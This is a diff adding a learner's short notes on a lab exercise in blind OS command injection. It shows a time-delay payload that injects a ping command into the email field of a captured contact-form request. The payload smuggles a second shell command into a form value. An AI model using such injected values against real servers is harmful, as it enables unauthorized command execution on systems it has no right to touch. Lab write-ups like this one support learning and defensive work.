@@ -1,0 +1,10 @@
+so i will be using time delay in this lab. remember how time delays in sqli ?
+in sqli accroding to your conditions, if true might trigger the time delay or othehwise according to how it was set
+
+similar thing can also be done in this lab.
+example i can say "& ping -c 10 127.0.0.1 &", this causes the server to loopback it own address for 10 seconds delaying the request for 10 seconds or more.
+
+
+csrf=KWEcR38RbnWibcLJ3azu9mATHmsNs3iG&name=idris&email=test1%40test.ent&subject=it+was+good&message=hey+hey+heyhey+hey+hey+
+
+csrf=KWEcR38RbnWibcLJ3azu9mATHmsNs3iG&name=idris&email=test1%40test.ent%26 ping -c 10 127.0.0.1 %26&subject=it+was+good&message=hey+hey+heyhey+hey+hey+
